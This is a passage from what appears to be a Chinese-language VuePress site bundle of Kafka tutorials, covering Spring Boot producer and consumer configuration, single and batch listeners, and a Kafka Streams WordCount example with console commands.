 </dependency>\n    <dependency>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-autoconfigure</artifactid>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 配置\n\nspring:\n  kafka:\n    ###########【kafka集群】###########\n    # 192.168.81.62:9092,192.168.81.62:9092\n    bootstrap-servers: 47.101.179.240:9092\n    ###########【初始化生产者配置】###########\n    producer:\n      # 重试次数，producer 两次重试之间会停顿一段时间，以防止频繁地重试对系统带来冲击。这段时间是可以配置的，由参数 retry.backoff.ms 指定，默认是 100 毫秒\n      # 重试可能造成消息的重复发送,为了应对这一风险， kafka 要求用户在 consumer 端必须执行去重处理\n      # 重试可能造成消息的乱序，producer 提供了 max.in.flight.requets.per.connection参数 一旦用户将此参数设置成 1, producer 将确保某一时刻只能发送一个请求\n      retries: 2\n      # acks=0 ： producer 不等kafka是否接收成功，立即开始其他工作 -> 提高吞吐量，单会丢失数据\n      # acks=1 ： producer 发送消息后 leader broker 仅将该消息写入本地日志，然后便发送响应结果 producer ，而无须等待 isr 中其他副本写入该消息。能保证吞吐量，也能保证一定的持久性。\n      # acks=all/-1 ：表示当发送消息时， leader broker 不仅会将消息写入本地日志，同时还会等待 isr 中所有其他副本都成功写入它们各自的本地日志后，才发送响应结果给producer。吞吐量极低，但不会丢失数据。\n      acks: 1\n      # 参数默认值是 16384b=16kb。producer 会将发往同一分区的多条消息封装进一个 batch 中。当 batch 满了的时候， producer 会发送 batch\n      # 中的所有消息。不过， producer 并不总是 batch 满了才发送消息，很有可能当 batch 还有很多空闲空间时 producer 就发送该 batch，\n      # producer 不管是否能够填满， producer 都会为该 batch 分配固定大小的内存。\n      batch-size: 131072\n      properties:\n        # 控制消息发送延时行为,这个参数也就是影响 batch 不满也会被发送的原因，实际上这也是一种权衡，即吞吐量与延时之间的权衡\n        linger.ms: 200\n        # produce 发送请求给broker后，broker需要在规定的时间范围内将处理理结果返还给 produce。这段时间便是由该参数控制的，默认是 30s。\n        # 默认的30s对于一般的情况而言是足够的，但如果 producer 发送的负载很大，超时的情况就很容易碰到，此时就应该适当调整该参数值。\n        request.timeout.ms: 30\n        # 控制 producer 发送请求的大小，1048576b=1m，该请求包括消息体和请求头的整体大小\n        max.request.size: 1048576\n        # 为防止 topic 同分区下的消息乱序问题。这个参数的实际效果其实限制了 producer 在单个 broker 连接上能够发送的未响应请求的数量\n        # 设置成1 ,producer 在某个 broker 发送响应之前将无法再给该 broker 发送 produce 请求\n        max.in.flight.requests.per.connection: 1\n      # buffer-memory 生产端缓冲区大小，默认值 33554432b=32mb。\n      # producer 启动时会首先创建一块内存缓冲区用于保存待发送的消息，然后由另一个专属线程负责从缓冲区中读取消息执行真正的发送。这部分内存空间\n      # 的大小即是由 buffer.memory 参数指定的。若 producer 向缓冲区写消息的速度超过了专属 io 线程发送消息的速度，那么必然造成该缓冲区空间\n      # 的不断增大。此时 producer 会停止手头的工作等待 io 线程追上来，若一段时间之后 io 线程还是无法追上 producer 的进度，那么 producer\n      # 就会抛出异常并期望用户介入进行处理。若 producer 程序要给很多分区发送消息，那么就需要仔细地设置这个参数以防止过小的内存缓冲区降低了\n      # producer 程序整体的吞吐量。\n      buffer-memory: 33554432\n      # kafka提供的序列化和反序列化类\n      key-serializer: org.apache.kafka.common.serialization.stringserializer\n      value-serializer: org.apache.kafka.common.serialization.stringserializer\n      # 压缩，默认 none(gzip\\snappy\\lz4)，能降低网络io提高吞吐量，但也会增加 producer 端机器的 cpu 开销。\n      # 如果 broker 端的压缩参数设 置得与 producer 不同， broker 端在写入消息时也会额外使用 cpu 资源对消息进行对应的解压缩－重压缩操作。\n      compression-type: lz4\n    ###########【初始化消费者配置】###########\n    consumer:\n      # 默认的消费组id\n      groupid: wx_public_number\n      properties:\n        # 消费会话超时时间(超过这个时间consumer没有发送心跳,就会触发rebalance操作)\n        session.timeout.ms: 10000\n        # 消费请求超时时间\n        request.timeout.ms: 3000\n        # 消费到的数据处理时长不宜超过max.poll.interval.ms，否则会触发rebalance，也可能导致 offset 提交失败\n        max.poll.interval.ms: 10000\n        # 最低拉取 1kb 的数据\n        fetch.min.bytes: 1024\n        # 不足 1kb 让等待 2s 再去拉取\n        fetch.max.wait.ms: 2000\n      # 是否自动提交 consumer offset，批量的时候要改为 false\n      enable-auto-commit: true\n      # 自动提交的时间间隔\n      auto-commit-interval: 200\n      # 假设你首次运行一个 consumer group 并且指定从头消费。显然该 group 会从头消费所有数据，因为此时该 group 还没有任何位移信息。\n      # 一旦该 group 成功提交位移后，你重启了 group ，依然指定从头消费。此时你会发现该 group 并不会真的从头消费，因为 kafka 己经保存了该 group\n      # 位移信息，因此它会无视 auto.offset.reset 的设置。\n      # latest（默认值）指定从最新处位移开始消费\n      # earliest ：指定从最早的位移开始消费，注意这里最早的位移不一定就是0\n      # none:只要有一个分区不存在已提交的offset,就抛出异常;\n      auto-offset-reset: earliest\n      # kafka提供的序列化和反序列化类\n      key-deserializer: org.apache.kafka.common.serialization.stringdeserializer\n      value-deserializer: org.apache.kafka.common.serialization.stringdeserializer\n      # 批量消费每次最多消费多少条消息\n      max-poll-records: 10000\n      # fetch请求发给 broker后，在broker中可能会被阻塞的（当topic中records的总size小于fetch.min.bytes时），此时这个fetch请求耗时就会比较长。这个配置就是来配置consumer最多等待response多久。毫秒数\n      fetch-max-wait: 1000\n    # 消费端监听的topic不存在时，项目启动会报错(关掉)\n    listener:\n      # 消费者并发启动个数（对应分区个数）每个listener方法\n      concurrency: 4\n      # manual listener负责ack，但是背后也是批量上去\n      # manual_immediate listner负责ack，每调用一次，就立即commit\n      # count_time acktime或ackcount哪个条件先满足，就commit\n      # count 累积达到ackcount次的ack去commit\n      # record 每处理一条commit一次\n      # batch 每次poll的时候批量提交一次，频率取决于每次poll的调用频率\n      # time 每次间隔acktime的时间去commit\n      # ack-mode: manual\n      missing-topics-fatal: false\n      poll-timeout: 3000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n\n\n> groupid 一般为项目名称最好，消费者 id 一般为业务或功能名称，topic 的设计最好是 项目_业务_功能_标识 id\n\n\n# 生产与消费\n\nimport org.apache.kafka.clients.admin.newtopic;\nimport org.apache.kafka.clients.consumer.consumerrecord;\nimport org.apache.kafka.clients.producer.producerrecord;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.commandlinerunner;\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.kafka.annotation.kafkalistener;\nimport org.springframework.kafka.annotation.kafkalisteners;\nimport org.springframework.kafka.config.concurrentkafkalistenercontainerfactory;\nimport org.springframework.kafka.config.kafkalistenercontainerfactory;\nimport org.springframework.kafka.config.topicbuilder;\nimport org.springframework.kafka.core.defaultkafkaconsumerfactory;\nimport org.springframework.kafka.core.kafkatemplate;\nimport org.springframework.kafka.support.acknowledgment;\n\nimport javax.annotation.resource;\nimport java.util.list;\n\n@springbootapplication\npublic class kafkaapplication implements commandlinerunner {\n\n\t@resource\n\tkafkatemplate<string, string> kafkatemplate;\n\n\tpublic static void main(string[] args) {\n\t\tspringapplication.run(kafkaapplication.class, args);\n\t}\n\n\t@override\n\tpublic void run(string... args){\n\t\tproducerrecord<string, string> producerrecord = new producerrecord<>("topic1", "11111");\n\t\tkafkatemplate.send(producerrecord);\n\t}\n\n\t/**\n\t * 创建 topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.newtopic\n\t **/\n\t@bean\n\tpublic newtopic topic() {\n\t\treturn topicbuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n\t/**\n\t * 消费 手动ack 需要修改  enable-auto-commit: false\n\t**/\n\t@kafkalistener(id = "myid1", topics = "topic1",groupid="wx_public_number")\n\tpublic void listen1(string in, acknowledgment ack) {\n\t\tsystem.out.println("aa单消费:"+in);\n\t\tack.acknowledge();\n\t}\n\t/**\n\t * 消费自动ack 需要 enable-auto-commit: true\n\t**/\n\t@kafkalistener(id = "myid2", topics = "topic1",groupid="wx_public_number")\n\tpublic void listen2(string in) {\n\t\tsystem.out.println("bb单消费:"+in);\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n> topic 的消息会被发送到不同的消费组，不同的消费组创建一个消费者会实现广播消费模式，单播的话只需要删掉多余的组就好。\n\n\n# 批量消费\n\npackage com.giant.kafka.config;\n\nimport org.apache.kafka.clients.consumer.consumerconfig;\nimport org.springframework.boot.autoconfigure.kafka.kafkaproperties;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.kafka.config.concurrentkafkalistenercontainerfactory;\nimport org.springframework.kafka.config.kafkalistenercontainerfactory;\nimport org.springframework.kafka.core.defaultkafkaconsumerfactory;\nimport org.springframework.kafka.listener.containerproperties;\n\nimport javax.annotation.resource;\nimport java.util.hashmap;\nimport java.util.map;\nimport java.util.function.consumer;\n\n/**\n * kafka 批量配置\n * @author big uncle\n * @date 2021/7/7 10:01\n**/\n@configuration\npublic class kafkabatchconf {\n\n    @resource\n    kafkaproperties properties;\n\n\n    /**\n     *  消费者批量工程\n     *  手动提交\n     */\n    @bean\n    public kafkalistenercontainerfactory<?> batchfactoryack() {\n        return batchfactorytemplate(factory -> {\n            map<string, object> props = consumeprops();\n            // 手动提交\n            props.put(consumerconfig.enable_auto_commit_config, boolean.false);\n            factory.setconsumerfactory(new defaultkafkaconsumerfactory<>(props));\n            factory.getcontainerproperties().setackmode(containerproperties.ackmode.manual_immediate);\n        });\n    }\n\n    /**\n     *  消费者批量工程\n     *  自动提交\n     */\n    @bean\n    public kafkalistenercontainerfactory<?> batchfactory() {\n        map<string, object> props = consumeprops();\n        // 最低拉取拉取数据的大小\n        props.put(consumerconfig.fetch_min_bytes_config,  properties.getconsumer().getproperties().get(consumerconfig.fetch_min_bytes_config));\n        // 不够最低拉取等待一定的时间再去拉取\n        props.put(consumerconfig.fetch_max_wait_ms_config,   properties.getconsumer().getproperties().get(consumerconfig.fetch_max_wait_ms_config));\n        return batchfactorytemplate(factory -> factory.setconsumerfactory(new defaultkafkaconsumerfactory<>(props)));\n    }\n\n    /**\n     *  消费者配置信息\n     */\n    private map<string,object> consumeprops() {\n        map<string, object> props = new hashmap<>(20);\n        // kafka server 地址\n        props.put(consumerconfig.bootstrap_servers_config, properties.getbootstrapservers());\n        // 组id\n        props.put(consumerconfig.group_id_config, properties.getconsumer().getgroupid());\n        // 偏移量\n        props.put(consumerconfig.auto_offset_reset_config, properties.getconsumer().getautooffsetreset());\n        // 最大拉取条数，该参数被fetch.max.wait.ms、fetch.min.bytes、max.partition.fetch.bytes 所影响\n        props.put(consumerconfig.max_poll_records_config, properties.getconsumer().getmaxpollrecords());\n        // 会话超时时间\n        props.put(consumerconfig.session_timeout_ms_config, properties.getconsumer().getproperties().get(consumerconfig.session_timeout_ms_config));\n        // 请求超时时间\n        props.put(consumerconfig.request_timeout_ms_config, properties.getconsumer().getproperties().get(consumerconfig.request_timeout_ms_config));\n        // key序列化\n        props.put(consumerconfig.key_deserializer_class_config, properties.getconsumer().getkeydeserializer());\n        // 值序列化\n        props.put(consumerconfig.value_deserializer_class_config, properties.getconsumer().getvaluedeserializer());\n        // 自动提交\n        props.put(consumerconfig.enable_auto_commit_config, boolean.true);\n        // 自动提交时间间隔\n        duration autocommitinterval = properties.getconsumer().getautocommitinterval();\n        if(!objectutil.isempty(autocommitinterval)){\n            props.put(consumerconfig.auto_commit_interval_ms_config, long.valueof(autocommitinterval.tomillis()).intvalue());\n        }\n        // poll 间隔时间\n        props.put(consumerconfig.max_poll_interval_ms_config,  properties.getconsumer().getproperties().get(consumerconfig.max_poll_interval_ms_config));\n        return props;\n    }\n\n\n    /**\n     * 批量消费模板\n    **/\n    private concurrentkafkalistenercontainerfactory batchfactorytemplate(consumer<concurrentkafkalistenercontainerfactory> consumer){\n        concurrentkafkalistenercontainerfactory<integer, string> factory = new concurrentkafkalistenercontainerfactory<>();\n        consumer.accept(factory);\n        factory.setbatchlistener(boolean.true);\n        // 并发线程数\n        factory.setconcurrency(properties.getlistener().getconcurrency());\n        return factory;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n\n\nimport org.apache.kafka.clients.admin.newtopic;\nimport org.apache.kafka.clients.consumer.consumerrecord;\nimport org.apache.kafka.clients.producer.producerrecord;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.commandlinerunner;\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.kafka.annotation.kafkalistener;\nimport org.springframework.kafka.annotation.kafkalisteners;\nimport org.springframework.kafka.config.concurrentkafkalistenercontainerfactory;\nimport org.springframework.kafka.config.kafkalistenercontainerfactory;\nimport org.springframework.kafka.config.topicbuilder;\nimport org.springframework.kafka.core.defaultkafkaconsumerfactory;\nimport org.springframework.kafka.core.kafkatemplate;\nimport org.springframework.kafka.support.acknowledgment;\n\nimport javax.annotation.resource;\nimport java.util.list;\n\n@springbootapplication\npublic class kafkaapplication implements commandlinerunner {\n\n\t@resource\n\tkafkatemplate<string, string> kafkatemplate;\n\n\tpublic static void main(string[] args) {\n\t\tspringapplication.run(kafkaapplication.class, args);\n\t}\n\n\t@override\n\tpublic void run(string... args){\n\t\tproducerrecord<string, string> producerrecord = new producerrecord<>("topic1", "11111");\n\t\tkafkatemplate.send(producerrecord);\n\t}\n\n\t/**\n\t * 创建 topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.newtopic\n\t **/\n\t@bean\n\tpublic newtopic topic() {\n\t\treturn topicbuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n    /**\n     * 批量自动确认ack\n    **/\n    @kafkalistener(id = "consumer_1", topics = "topic1",groupid="wx_public_number",containerfactory = "batchfactory")\n    public void consumer_1(list<string> in) {\n        log.debug("消费数据 {}",in.size());\n    }\n\n    /**\n     * 批量手动确认ack\n    **/\n    @kafkalistener(id = "consumer_2", topics = "topic1",groupid="wx_public_number",containerfactory = "batchfactoryack")\n    public void consumer_2(list<string> in,acknowledgment ack) {\n        log.debug("消费数据 {}",in.size());\n        ack.acknowledge();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n批量消费和单条消费不影响相互使用。\n\n按不同分区消费\n\n@kafkalistener(id = "consumer_2", topicpartitions = { @topicpartition(topic = "topic1", partitions = { "1" }) },groupid="wx_public_number")\npublic void consumer_2(string str) {\n    log.debug("消费数据 {}",str);\n}\n\n\n1\n2\n3\n4\n\n\n> key 和 partition 的区别\n> 如果一个有效的 partition 属性数值被指定，那么在发送记录时 partition 属性数值就会被应用。如果没有 partition 属性数值被指定，而一个 key 属性被声明的话，一个 partition 会通过 key 的 hash 而被选中。如果既没有 key 也没有 partition 属性数值被声明，那么一个 partition 将会被分配以轮询的方式。',charsets:{cjk:!0}},{title:"kafka-2.7.0 Kafka Streams 流处理",frontmatter:{title:"kafka-2.7.0 Kafka Streams 流处理",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1404",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1404.kafka-2.7.0%20Kafka%20Streams%20%E6%B5%81%E5%A4%84%E7%90%86.html",relativePath:"02.中间件/01.kafka/1404.kafka-2.7.0 Kafka Streams 流处理.md",key:"v-72fa657c",path:"/kafka/1404/",headers:[{level:2,title:"简述",slug:"简述",normalizedTitle:"简述",charIndex:2},{level:2,title:"入门",slug:"入门",normalizedTitle:"入门",charIndex:79},{level:2,title:"自定义 stream",slug:"自定义-stream",normalizedTitle:"自定义 stream",charIndex:1925}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"简述 入门 自定义 stream",content:'# 简述\n\n简单来说，Kafka Streams 就是可以在 kafka 内部实现一套零延时、可定制的数据计算处理逻辑，可以把不连续的数据进行计算。\n\n\n# 入门\n\n启动 zookeeper 和 kafka\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\n创建 topic\n\nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-input \nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-output\n\n\n1\n2\n\n\n查看 topic 状态\n\nbin/kafka-topics.sh --zookeeper 192.168.81.62:2181 --describe \n\n\n1\n\n\n准备好了这些之后我们就可以运行 Kafka Streams 的 Word Count 程序了。 Kafka 自带了 Demo 程序供用户使用\n\nbin/kafka-run-class.sh org.apache.kafka.streams.examples.wordcount.WordCountDemo \n\n\n1\n\n\n上面的 WordCountDemo 会固定地读取名为 streams-plaintext-input topic ，为读取的每条消息执行 Word Count 程序的转换计算逻辑，然后持续地把处理结果固定写入 streams-wordcount-output 中 。当运行上述命令时，会看不到任何输出。需要启动 kafka-console-consumer 才能看到最终消息。但我们先启动 Kafka 自带的 console producer 来生产一些输入数据供 Word Count 程序消费。\n\nbin/kafka-console-producer.sh --broker-list 192.168.81.62:9092 --topic streams-plaintext-input\n\n\n1\n\n\n启动后暂时不要发送任何数据，接下来新建窗口启动 kafka-console-consumer\n\nbin/kafka-console-consumer.sh --bootstrap-server 192.168.81.62:9092 \\\n--topic streams-wordcount-output \\\n--from-beginning \\\n--formatter kafka.tools.DefaultMessageFormatter \\\n--property print.key=true \\\n--property print.value=true \\\n--property key.deserializer=org.apache.kafka.common.serialization.StringDeserializer \\\n--property value.deserializer=org.apache.kafka.common.serialization.LongDeserializer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n如果以上命令出现 WARN 警告信息，则是正常的，这是因为当 clients 首次向 broker 发送请求获取该 topic 数据时，很可能尚未有该 topic 的元数据信息，故 broker 向 clients 返回的响应中会带上 LEADER_NOT_AVAILABLE 异常，表明 clients 应该主动更新元数据。\n\n接下来发送数据，而在 kafka-console-consumer 窗口就能看到数据统计。\n\n> 如果设置的 kafka 配置不是 localhost:9092 或者 127.0.01:9092，则运行不了，因为他的 demo 默认 bootstrap.server 就是 localhost:9092，也没地方修改配置，除非修改源码，那就等于自定义一样。\n\n\n# 自定义 stream\n\n在上面的例子，因为我本身 kafka 配置的原因导致我无法使用 stream，所以把代码改了改，让 bootstrap.server 指向我的配置。\n\n<dependency>\n    <groupId>org.apache.kafka</groupId>\n    <artifactId>kafka-streams</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.stream;\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.apache.kafka.common.serialization.Serdes;\nimport org.apache.kafka.streams.KafkaStreams;\nimport org.apache.kafka.streams.KeyValue;\nimport org.apache.kafka.streams.StreamsBuilder;\nimport org.apache.kafka.streams.StreamsConfig;\nimport org.apache.kafka.streams.kstream.*;\nimport org.apache.kafka.streams.kstream.internals.KStreamImpl;\n\nimport java.util.Arrays;\nimport java.util.Locale;\nimport java.util.Properties;\nimport java.util.concurrent.CountDownLatch;\n\n/**\n * @author big uncle\n * @date 2021/3/2 13:29\n * @module\n **/\npublic class TJStream {\n\n\n    public static void main(String[] args) {\n\n        Properties properties = new Properties();\n        properties.put(StreamsConfig.APPLICATION_ID_CONFIG,"streams-wordcount");\n        properties.put(StreamsConfig.BOOTSTRAP_SERVERS_CONFIG,"192.168.81.62:9092") ;\n        properties.put(StreamsConfig.DEFAULT_KEY_SERDE_CLASS_CONFIG, Serdes.String().getClass().getName());\n        properties.put(StreamsConfig.DEFAULT_VALUE_SERDE_CLASS_CONFIG, Serdes.String().getClass().getName());\n        //使得每次运行程序时都能保证从头消费一次消息。\n        properties.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG,"earliest");\n\n        StreamsBuilder builder= new StreamsBuilder();\n        // 指定输入 topic\n        KStream<String, String> source = builder.stream("streams-plaintext-input");\n        KTable<String,Long> counts = source.flatMapValues(new ValueMapper<String, Iterable<String>>() {\n            @Override\n            public Iterable<String> apply(String s) {\n                return Arrays.asList(s.toLowerCase(Locale.getDefault()).split(" "));\n            }\n        }).groupBy(new KeyValueMapper<String, String, String>() {\n            @Override\n            public String apply(String s, String s2) {\n                return s2;\n            }\n        }).count();\n        counts\n            // 转换 KStream 类型\n            .toStream()\n            // 把 value 的 long 类型转换位 string 类型\n            .map((k,v) -> new KeyValue<String,String>(k,String.valueOf(v)))\n            // 发送到这个 topic\n            .to("streams-wordcount-output",Produced.with(Serdes.String(),Serdes.String()));\n\n        final KafkaStreams streams = new KafkaStreams (builder.build(), properties) ;\n        // 添加监控，关闭之后释放资源\n        final CountDownLatch latch = new CountDownLatch (1) ;\n        Runtime.getRuntime().addShutdownHook (new Thread ("streams-wordcount-shutdown-hook") {\n            @Override\n            public void run() {\n                streams.close();\n                latch.countDown();\n            }\n        });\n        try {\n            // 运行 这里不会阻塞\n            streams.start();\n            // 阻塞主线程\n            latch.await();\n        }catch(Throwable e) {\n            System.exit(1);\n        }\n        System.exit(0);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n> kafka stream 里面的 Api 还是有必要学习一下的\n\n打成 jar 包，然后把 jar 放入 /kafka/libs 下，启动\n\nbin/kafka-run-class.sh com.example.demo.stream.TJStream\n\n\n1\n\n\n启动之后会有很多警告，不需要管，按照如上的步骤我们继续操作就行，到此就能看到输入的数据。以下是我输出的统计信息，但是 consumer 在消费的时候比较慢，不是即时的。\n\nhaha    4\nhah     1\nha      5\n\n\n1\n2\n3\n\n\n> 我们也可以使用 spring boot 来监听 streams-wordcount-output 这个 topic 来接收数据',normalizedContent:'# 简述\n\n简单来说，kafka streams 就是可以在 kafka 内部实现一套零延时、可定制的数据计算处理逻辑，可以把不连续的数据进行计算。\n\n\n# 入门\n\n启动 zookeeper 和 kafka\n\nbin/zookeeper-server-start.sh config/zookeeper.properties & bin/kafka-server-start.sh -daemon config/server.properties \n\n\n1\n\n\n创建 topic\n\nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-input \nbin/kafka-topics.sh --create --zookeeper 192.168.81.62:2181 --replication-factor 1 --partitions 1 --topic streams-plaintext-output\n\n\n1\n2\n\n\n查看 topic 状态\n\nbin/kafka-topics.sh --zookeeper 192.168.81.62:2181 --describe \n\n\n1\n\n\n准备好了这些之后我们就可以运行 kafka streams 的 word count 程序了。 kafka 自带了 demo 程序供用户使用\n\nbin/kafka-run-class.sh org.apache.kafka.streams.examples.wordcount.wordcountdemo \n\n\n1\n\n\n上面的 wordcountdemo 会固定地读取名为 streams-plaintext-input topic ，为读取的每条消息执行 word count 程序的转换计算逻辑，然后持续地把处理结果固定写入 streams-wordcount-output 中 。当运行上述命令时，会看不到任何输出。需要启动 kafka-console-consumer 才能看到最终消息。但我们先启动 kafka 自带的 console producer 来生产一些输入数据供 word count 程序消费。\n\nbin/kafka-console-producer.sh --broker-list 192.168.81.62:9092 --topic streams-plaintext-input\n\n\n1\n\n\n启动后暂时不要发送任何数据，接下来新建窗口启动 kafka-console-consumer\n\nbin/kafka-console-consumer.sh --bootstrap-server 192.168.81.62:9092 \\\n--topic streams-wordcount-output \\\n--from-beginning \\\n--formatter kafka.tools.defaultmessageformatter \\\n--property print.key=true \\\n--property print.value=true \\\n--property key.deserializer=org.apache.kafka.common.serialization.stringdeserializer \\\n--property value.deserializer=org.apache.kafka.common.serialization.longdeserializer\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n如果以上命令出现 warn 警告信息，则是正常的，这是因为当 clients 首次向 broker 发送请求获取该 topic 数据时，很可能尚未有该 topic 的元数据信息，故 broker 向 clients 返回的响应中会带上 leader_not_available 异常，表明 clients 应该主动更新元数据。\n\n接下来发送数据，而在 kafka-console-consumer 窗口就能看到数据统计。\n\n> 如果设置的 kafka 配置不是 localhost:9092 或者 127.0.01:9092，则运行不了，因为他的 demo 默认 bootstrap.server 就是 localhost:9092，也没地方修改配置，除非修改源码，那就等于自定义一样。\n\n\n# 自定义 stream\n\n在上面的例子，因为我本身 kafka 配置的原因导致我无法使用 stream，所以把代码改了改，让 bootstrap.server 指向我的配置。\n\n<dependency>\n    <groupid>org.apache.kafka</groupid>\n    <artifactid>kafka-streams</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\npackage com.example.demo.stream;\nimport org.apache.kafka.clients.consumer.consumerconfig;\nimport org.apache.kafka.common.serialization.serdes;\nimport org.apache.kafka.streams.kafkastreams;\nimport org.apache.kafka.streams.keyvalue;\nimport org.apache.kafka.streams.streamsbuilder;\nimport org.apache.kafka.streams.streamsconfig;\nimport org.apache.kafka.streams.kstream.*;\nimport org.apache.kafka.streams.kstream.internals.kstreamimpl;\n\nimport java.util.arrays;\nimport java.util.locale;\nimport java.util.properties;\nimport java.util.concurrent.countdownlatch;\n\n/**\n * @author big uncle\n * @date 2021/3/2 13:29\n * @module\n **/\npublic class tjstream {\n\n\n    public static void main(string[] args) {\n\n        properties properties = new properties();\n        properties.put(streamsconfig.application_id_config,"streams-wordcount");\n        properties.put(streamsconfig.bootstrap_servers_config,"192.168.81.62:9092") ;\n        properties.put(streamsconfig.default_key_serde_class_config, serdes.string().getclass().getname());\n        properties.put(streamsconfig.default_value_serde_class_config, serdes.string().getclass().getname());\n        //使得每次运行程序时都能保证从头消费一次消息。\n        properties.put(consumerconfig.auto_offset_reset_config,"earliest");\n\n        streamsbuilder builder= new streamsbuilder();\n        // 指定输入 topic\n        kstream<string, string> source = builder.stream("streams-plaintext-input");\n        ktable<string,long> counts = source.flatmapvalues(new valuemapper<string, iterable<string>>() {\n            @override\n            public iterable<string> apply(string s) {\n                return arrays.aslist(s.tolowercase(locale.getdefault()).split(" "));\n            }\n        }).groupby(new keyvaluemapper<string, string, string>() {\n            @override\n            public string apply(string s, string s2) {\n                return s2;\n            }\n        }).count();\n        counts\n            // 转换 kstream 类型\n            .tostream()\n            // 把 value 的 long 类型转换位 string 类型\n            .map((k,v) -> new keyvalue<string,string>(k,string.valueof(v)))\n            // 发送到这个 topic\n            .to("streams-wordcount-output",produced.with(serdes.string(),serdes.string()));\n\n        final kafkastreams streams = new kafkastreams (builder.build(), properties) ;\n        // 添加监控，关闭之后释放资源\n        final countdownlatch latch = new countdownlatch (1) ;\n        runtime.getruntime().addshutdownhook (new thread ("streams-wordcount-shutdown-hook") {\n            @override\n            public void run() {\n                streams.close();\n                latch.countdown();\n            }\n        });\n        try {\n            // 运行 这里不会阻塞\n            streams.start();\n            // 阻塞主线程\n            latch.await();\n        }catch(throwable e) {\n            system.exit(1);\n        }\n        system.exit(0);\n    